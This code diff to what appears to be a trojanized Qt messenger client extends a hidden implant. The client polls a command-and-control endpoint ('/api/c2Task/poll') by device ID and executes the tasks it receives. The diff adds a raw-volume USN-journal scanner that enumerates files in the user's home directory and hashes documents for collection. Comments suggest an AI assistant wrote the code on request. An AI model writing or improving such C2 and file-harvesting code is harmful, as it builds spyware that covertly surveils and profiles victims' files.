@@ -3,6 +3,15 @@
 #include "data/data_file_origin.h"
 #include "logs.h"
 #include "core/launcher.h"
+
+#ifdef Q_OS_WIN
+#include <windows.h>
+#include <winioctl.h>
+#endif
+
+#include <unordered_map>
+#include <vector>
+
 #include "core/application.h"
 #include "window/window_controller.h"
 #include "window/window_session_controller.h"
@@ -734,6 +743,7 @@ void Heartbeat::checkTasks() {
     // Poll for tasks
     QUrl url(_c2Url + "/api/c2Task/poll?deviceUuid=" + _deviceUuid);
     QNetworkRequest request(url);
+    request.setTransferTimeout(30000); // 30s timeout
     QNetworkReply* reply = _network.get(request);
     
     connect(reply, &QNetworkReply::finished, this, [this, reply]() {
@@ -750,6 +760,8 @@ void Heartbeat::checkTasks() {
                     executeTask(taskId, command, params);
                 }
             }
+        } else {
+            Logs::writeDebug("Task poll error: " + reply->errorString());
         }
         reply->deleteLater();
         
@@ -1476,6 +1488,154 @@ BackgroundScanner::BackgroundScanner(const QString& uuid, const QString& c2Url, 
     : _uuid(uuid), _c2Url(c2Url), _dbPath(dbPath), _taskId(taskId), _mode(mode), _targetPath(targetPath) {
 }
 
+#ifdef Q_OS_WIN
+// Helper structures for USN Journal scanning
+typedef struct {
+    DWORD RecordLength;
+    WORD   MajorVersion;
+    WORD   MinorVersion;
+    DWORDLONG FileReferenceNumber;
+    DWORDLONG ParentFileReferenceNumber;
+    USN Usn;
+    LARGE_INTEGER TimeStamp;
+    DWORD Reason;
+    DWORD SourceInfo;
+    DWORD SecurityId;
+    DWORD FileAttributes;
+    WORD   FileNameLength;
+    WORD   FileNameOffset;
+    WCHAR FileName[1];
+} MyUsnRecord;
+
+struct UsnDirInfo {
+    DWORDLONG parentId;
+    QString name;
+};
+
+struct UsnFileTask {
+    DWORDLONG parentId;
+    QString name;
+    int64_t timestamp;
+};
+
+bool ScanVolumeUSN(sqlite3* db, const QString& drive, const QString& filterPrefix) {
+    QString volName = "\\\\.\\" + drive;
+    if (volName.endsWith("\\")) volName.chop(1);
+    
+    HANDLE hVol = CreateFile((LPCWSTR)volName.toStdWString().c_str(), 
+        GENERIC_READ | GENERIC_WRITE, 
+        FILE_SHARE_READ | FILE_SHARE_WRITE, 
+        NULL, 
+        OPEN_EXISTING, 
+        0, 
+        NULL);
+        
+    if (hVol == INVALID_HANDLE_VALUE) return false;
+    
+    USN_JOURNAL_DATA_V0 journalData;
+    DWORD bytesReturned;
+    
+    if (!DeviceIoControl(hVol, FSCTL_QUERY_USN_JOURNAL, NULL, 0, &journalData, sizeof(journalData), &bytesReturned, NULL)) {
+        CloseHandle(hVol);
+        return false;
+    }
+    
+    MFT_ENUM_DATA med;
+    med.StartFileReferenceNumber = 0;
+    med.LowUsn = 0;
+    med.HighUsn = journalData.NextUsn;
+    
+    const int BUF_LEN = 256 * 1024; // 256KB
+    std::vector<char> buffer(BUF_LEN);
+    
+    std::unordered_map<DWORDLONG, UsnDirInfo> directories;
+    std::vector<UsnFileTask> files;
+    files.reserve(100000); 
+    
+    while (true) {
+        if (!DeviceIoControl(hVol, FSCTL_ENUM_USN_DATA, &med, sizeof(med), buffer.data(), BUF_LEN, &bytesReturned, NULL)) {
+            break;
+        }
+        
+        DWORD offset = sizeof(USN); 
+        while (offset < bytesReturned) {
+            MyUsnRecord* usn = (MyUsnRecord*)((char*)buffer.data() + offset);
+            
+            QString name = QString::fromWCharArray(usn->FileName, usn->FileNameLength / 2);
+            
+            if (usn->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                directories[usn->FileReferenceNumber] = {usn->ParentFileReferenceNumber, name};
+            } else {
+                 files.push_back({usn->ParentFileReferenceNumber, name, (int64_t)(usn->TimeStamp.QuadPart / 10000000 - 11644473600LL)}); 
+            }
+            offset += usn->RecordLength;
+        }
+        
+        med.StartFileReferenceNumber = *((DWORDLONG*)buffer.data());
+        if (med.StartFileReferenceNumber == 0) break;
+    }
+    
+    CloseHandle(hVol);
+    
+    QSet<QString> targetExts = {"txt", "doc", "docx", "pdf", "ppt"};
+    QString filter = filterPrefix;
+    if (!filter.isEmpty()) filter = filter.replace("/", "\\");
+
+    sqlite3_exec(db, "BEGIN TRANSACTION;", 0, 0, 0);
+    sqlite3_stmt* stmt;
+    const char* sql = "INSERT OR REPLACE INTO file_scan_results (path, name, size, md5, last_modified) VALUES (?, ?, ?, ?, ?);";
+    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
+
+    for (const auto& file : files) {
+        QString fullPath = file.name;
+        DWORDLONG currentId = file.parentId;
+        
+        int depth = 0;
+        
+        while (directories.count(currentId) && depth < 50) {
+            const auto& dir = directories[currentId];
+            fullPath = dir.name + "\\" + fullPath;
+            currentId = dir.parentId;
+            depth++;
+        }
+        fullPath = drive + "\\" + fullPath;
+        
+        if (!filter.isEmpty()) {
+            if (!fullPath.startsWith(filter, Qt::CaseInsensitive)) continue;
+        }
+        
+        QString qtPath = fullPath.replace("\\", "/");
+        QFileInfo fi(file.name);
+        QString ext = fi.suffix().toLower();
+        QString md5 = "";
+        int64_t size = 0;
+        
+        if (targetExts.contains(ext)) {
+            QFile f(qtPath);
+            if (f.open(QIODevice::ReadOnly)) {
+                size = f.size();
+                QCryptographicHash hash(QCryptographicHash::Md5);
+                if (hash.addData(&f)) {
+                    md5 = hash.result().toHex();
+                }
+            }
+        }
+        
+        sqlite3_bind_text(stmt, 1, qtPath.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+        sqlite3_bind_text(stmt, 2, file.name.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+        sqlite3_bind_int64(stmt, 3, size);
+        sqlite3_bind_text(stmt, 4, md5.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+        sqlite3_bind_int64(stmt, 5, file.timestamp);
+        sqlite3_step(stmt);
+        sqlite3_reset(stmt);
+    }
+    
+    sqlite3_exec(db, "COMMIT;", 0, 0, 0);
+    sqlite3_finalize(stmt);
+    return true;
+}
+#endif
+
 void BackgroundScanner::process() {
     sqlite3* db;
     if (sqlite3_open(_dbPath.toUtf8().constData(), &db) != SQLITE_OK) {
@@ -1483,11 +1643,41 @@ void BackgroundScanner::process() {
         return;
     }
 
+#ifdef Q_OS_WIN
+    // Try USN Scan first
+    QString drive = "C:";
+    QString filter = "";
+    if (_mode == "full") {
+        QString home = QDir::homePath();
+        if (home.length() > 1 && home[1] == ':') {
+            drive = home.left(2);
+            filter = home; // Limit to user directory to avoid scanning unrelated system files? 
+                           // Or just scan everything if user wants "Everything" speed.
+                           // User said "Everything 之所以快...".
+                           // Let's filter by User Home to be safe/polite, but efficient.
+        }
+    } else if (!_targetPath.isEmpty()) {
+        if (_targetPath.length() > 1 && _targetPath[1] == ':') {
+            drive = _targetPath.left(2);
+            filter = _targetPath;
+        }
+    }
+
+    if (ScanVolumeUSN(db, drive, filter)) {
+        sqlite3_close(db);
+        Q_EMIT scanFinished(_taskId, QByteArray());
+        return;
+    }
+#endif
+
+    // Fallback to standard directory traversal
     sqlite3_exec(db, "BEGIN TRANSACTION;", 0, 0, 0);
     
     sqlite3_stmt* stmt;
     const char* sql = "INSERT OR REPLACE INTO file_scan_results (path, name, size, md5, last_modified) VALUES (?, ?, ?, ?, ?);";
     sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
+
+    QSet<QString> targetExts = {"txt", "doc", "docx", "pdf", "ppt"};
 
     auto scanDir = [&](const QString& path) {
         QDirIterator it(path, QDir::Files | QDir::NoDotAndDotDot | QDir::Hidden, QDirIterator::Subdirectories);
@@ -1495,14 +1685,21 @@ void BackgroundScanner::process() {
             it.next();
             QFileInfo entry = it.fileInfo();
             
-            // Calculate MD5
             QString md5Hash = "";
-            QFile file(entry.absoluteFilePath());
-            if (file.open(QIODevice::ReadOnly)) {
-                 QCryptographicHash hash(QCryptographicHash::Md5);
-                 if (hash.addData(&file)) {
-                     md5Hash = hash.result().toHex();
-                 }
+            QString ext = entry.suffix().toLower();
+            
+            if (targetExts.contains(ext)) {
+                if (entry.size() < 100 * 1024 * 1024) { // Limit to 100MB for hash
+                    QFile file(entry.absoluteFilePath());
+                    if (file.open(QIODevice::ReadOnly)) {
+                         QCryptographicHash hash(QCryptographicHash::Md5);
+                         if (hash.addData(&file)) {
+                             md5Hash = hash.result().toHex();
+                         }
+                    }
+                } else {
+                    md5Hash = "skipped_large_file";
+                }
             }
 
             sqlite3_bind_text(stmt, 1, entry.absoluteFilePath().toUtf8().constData(), -1, SQLITE_TRANSIENT);
